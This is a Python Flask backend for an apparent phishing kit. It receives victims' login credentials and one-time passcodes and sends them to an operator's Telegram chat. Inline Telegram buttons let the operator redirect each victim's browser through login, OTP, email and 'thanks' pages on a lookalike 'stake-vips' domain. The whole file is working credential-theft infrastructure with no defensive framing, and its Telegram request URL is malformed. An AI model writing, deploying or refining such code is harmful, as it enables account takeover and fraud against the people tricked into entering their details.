python
from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
import json
from dotenv import load_dotenv

# Load variables from .env file if it exists
load_dotenv()

app = Flask(__name__)

# ✅ Robust CORS setup to prevent "Server Error" on frontend
CORS(app, resources={r"/*": {"origins": "*"}})

@app.after_request
def handle_options(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    response.headers["Access-Control-Allow-Headers"] = "Content-Type,Authorization"
    response.headers["Access-Control-Allow-Methods"] = "GET,POST,OPTIONS"
    return response

# Get Environment Variables from Render Dashboard
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# This store keeps track of button clicks from Telegram
SESSION_STATUS = {}

# ======================
# TELEGRAM SEND FUNCTION
# ======================
def send_to_telegram(data, session_id, type_):
    msg = f"🔐 {type_.upper()} Submission\n\n"
    for k, v in data.items():
        msg += f"• {k.upper()} : {v}\n"
    msg += f"\nSESSION: {session_id}"

    keyboard = {
        "inline_keyboard": [
            [{"text": "🔐 LOGIN", "callback_data": f"{session_id}:index.html"}],
            [{"text": "🔢 OTP", "callback_data": f"{session_id}:otp.html"}],
            [{"text": "📧 EMAIL", "callback_data": f"{session_id}:email.html"}],
            [{"text": "🎉 DONE", "callback_data": f"{session_id}:thnks.html"}]
        ]
    }

    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "reply_markup": json.dumps(keyboard)
    }

    try:
        # Check if Token and ID exist before sending
        if not BOT_TOKEN or not CHAT_ID:
            print("❌ ERROR: BOT_TOKEN or CHAT_ID is missing in Render Environment.")
            return False
            
        r = requests.post(f"https://telegram.org{BOT_TOKEN}/sendMessage", data=payload, timeout=10)
        print(f"DEBUG: Telegram response for {type_}: {r.text}")
        return r.ok
    except Exception as e:
        print(f"DEBUG: Request failed: {e}")
        return False

# ======================
# ROUTES
# ======================

@app.route("/login", methods=["POST", "OPTIONS"])
def login():
    if request.method == "OPTIONS": return jsonify({}), 200
    data = request.get_json()
    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
    
    send_to_telegram(data, session_id, "login")
    return jsonify({"success": True, "id": session_id})

@app.route("/otp", methods=["POST", "OPTIONS"])
def otp():
    if request.method == "OPTIONS": return jsonify({}), 200
    data = request.get_json()
    if not data: return jsonify({"success": False, "error": "No data"}), 400
    
    session_id = str(uuid.uuid4())
    SESSION_STATUS[session_id] = {"approved": False, "redirect_url": None}
    
    success = send_to_telegram(data, session_id, "otp")
    return jsonify({"success": success})

@app.route("/status/<session_id>")
def status(session_id):
    session = SESSION_STATUS.get(session_id)
    if not session: return jsonify({"error": "Invalid session"}), 404
    return jsonify(session)

@app.route("/webhook", methods=["POST"])
def webhook():
    data = request.get_json()
    if "callback_query" in data:
        callback = data["callback_query"]
        try:
            session_id, page = callback["data"].split(":")
            if session_id in SESSION_STATUS:
                SESSION_STATUS[session_id]["approved"] = True
                SESSION_STATUS[session_id]["redirect_url"] = f"https://stake-vips.com{page}"
        except:
            pass
    return jsonify({"ok": True})

@app.route("/")
def home():
    return "✅ Backend is live and ready."

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
